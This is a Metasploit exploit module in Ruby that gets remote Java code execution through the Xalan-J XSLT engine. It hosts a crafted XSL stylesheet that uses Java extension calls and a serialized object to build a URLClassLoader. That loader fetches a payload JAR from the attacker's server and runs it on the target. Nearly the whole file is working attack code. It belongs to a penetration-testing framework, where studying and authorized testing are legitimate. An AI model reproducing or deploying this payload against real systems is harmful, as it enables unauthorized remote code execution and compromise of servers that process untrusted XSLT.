##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Generic XSLT+Java Code Execution',
			'Description'    => %q{
				This module exploits a feature in the Xalan-J XSLT engine.
			},
			'Author'	=> 
				[
					'Spencer McIntyre',	# Liferay module used as skeleton
					'Michael Schierl',	# JavaPayload / loading arbitrary Java classes
					'Nicolas Gregoire',	# This code
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://xhe.myxwiki.org/xwiki/bin/view/XSLT/Engine_XalanJ' ],
				],
			'Privileged'	=> true,
			'Platform'		=> [ 'java' ],
			'Arch'			=> ARCH_JAVA,
			'Payload'       => { 'BadChars' => '', 'DisableNops' => true },
			'Stance'		=> Msf::Exploit::Stance::Aggressive,
			'Targets'		=>
				[
					[ 'Automatic',		{ 'foobar' => 0 } ],
				],
			'DisclosureDate' => 'January 12, 2011', # Liferay portal issue # 14726
			'DefaultTarget'  => 0))
	end
	
	def exploit
		app_base = rand_text_alphanumeric(8 + rand(8))
		malicious_url = "http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{app_base}"
		@xsl_data = load_jar_with_xsl("#{datastore['SRVHOST']}:#{datastore['SRVPORT']}", app_base + '.jar')
		
		start_service({'Uri' => {
				'Proc' => Proc.new { |cli, req|
					on_request_uri(cli, req, 'XSL')
				},
				'Path' => '/' + app_base + '.xsl'
		}})
		start_service({'Uri' => {
				'Proc' => Proc.new { |cli, req|
					on_request_uri(cli, req, 'XML')
				},
				'Path' => '/' + app_base + '.xml'
		}})
		start_service({'Uri' => {
				'Proc' => Proc.new { |cli, req|
					on_request_payload_uri(cli, req, 'JAR')
				},
				'Path' => '/' + app_base + '.jar'
		}})
		
		
		# wait for the data to be sent
		while (not @jar_sent)
			select(nil, nil, nil, 1)
		end
		
		print_status("Shutting down the web service...")
		stop_service
		return
		
	end
	
	# Handle incoming requests from the server
	def on_request_uri(cli, request, resource)
		print_status("Sending the #{resource} file to the server...")
		send_response(cli, @xsl_data)
	end
	
	def on_request_payload_uri(cli, request, resource)
		print_status("Sending the #{resource} payload to the server...")
		p = regenerate_payload(cli)
		if not p
			print_error("Failed to generate the payload.")
			send_not_found(cli)
			return
		end

		jar = p.encoded_jar
		jar.add_file("#{rand_text_alphanumeric(8 + rand(8))}.class", @applet_class)
		jar.build_manifest(:main_class => "metasploit.Payload")
		
		send_response( cli, jar.to_s, { 'Content-Type' => "application/octet-stream" } )
		@jar_sent = true
	end
	
	def load_jar_with_xsl(server_info, jar_resource)
		payload =  "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:j=\"http://xml.apache.org/xalan/java\" exclude-result-prefixes=\"j\">\n"
		payload << "<xsl:template match=\"/\">\n"
		payload << "<xsl:variable name=\"url\">http://#{server_info}/#{jar_resource}</xsl:variable>\n"
		payload << "<xsl:variable name=\"arrays\">rO0ABXVyAA9bTGphdmEubmV0LlVSTDtSUf0kxRtozQIAAHhwAAAAAXB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAAA</xsl:variable>\n"
		payload << "<xsl:variable name=\"ois\" select=\"j:java.io.ObjectInputStream.new(j:java.io.ByteArrayInputStream.new(j:decodeBuffer(j:sun.misc.BASE64Decoder.new(),$arrays)))\" />\n"
		payload << "<xsl:variable name=\"n\" select=\"j:get(j:java.util.HashMap.new(),'')\"/>\n"
		payload << "<xsl:variable name=\"c1\" select=\"j:getInterfaces(j:java.lang.Class.forName('java.lang.Number'))\"/>\n"
		payload << "<xsl:variable name=\"c2\" select=\"j:getInterfaces(j:java.lang.Class.forName('java.io.File'))\"/>\n"
		payload << "<xsl:variable name=\"l\" select=\"j:java.util.ArrayList.new()\"/>\n"
		payload << "<xsl:variable name=\"urlarray\" select=\"j:readObject($ois)\"/>\n"
		payload << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($urlarray,0,j:java.net.URL.new($url))\"/>\n"
		payload << "<xsl:value-of select=\"substring(j:add($l,$urlarray),5)\"/>\n"
		payload << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.net.URL;'))\"/>\n"
		payload << "<xsl:variable name=\"r\" select=\"j:newInstance(j:getConstructor(j:java.lang.Class.forName('java.net.URLClassLoader'),$c1),j:toArray($l))\"/>\n"
		payload << "<xsl:value-of select=\"j:clear($l)\"/>\n"
		payload << "<xsl:value-of select=\"substring(j:add($l,'metasploit.Payload'),5)\"/>\n"
		payload << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('java.lang.String'))\"/>\n"
		payload << "<xsl:variable name=\"z\" select=\"j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.ClassLoader'),'loadClass',$c1),$r,j:toArray($l))\"/>\n"
		payload << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.lang.String;'))\"/>\n"
		payload << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.String'))\"/>\n"
		payload << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Class;'))\"/>\n"
		payload << "<xsl:value-of select=\"j:clear($l)\"/>\n"
		payload << "<xsl:value-of select=\"substring(j:add($l,'main'),5)\"/>\n"
		payload << "<xsl:value-of select=\"substring(j:add($l,$c1),5)\"/>\n"
		payload << "<xsl:variable name=\"v\" select=\"j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.Class'),'getMethod',$c2),$z,j:toArray($l))\"/>\n"
		payload << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.Object'))\"/>\n"
		payload << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Object;'))\"/>\n"
		payload << "<xsl:value-of select=\"j:clear($l)\"/>\n"
		payload << "<xsl:value-of select=\"substring(j:add($l,j:readObject($ois)),5)\"/>\n"
		payload << "<xsl:value-of select=\"j:close($ois)\" />\n"
		payload << "<xsl:value-of select=\"substring(j:set($l,0,j:toArray($l)),1,0)\"/>\n"
		payload << "<xsl:value-of select=\"j:add($l,0,$n)\"/>\n"
		payload << "<xsl:value-of select=\"j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.reflect.Method'),'invoke',$c2),$v,j:toArray($l))\"/>\n"
		payload << "<result>Test Complete!</result>\n"
		payload << "</xsl:template>\n"
		payload << "</xsl:stylesheet>\n"
	end
end
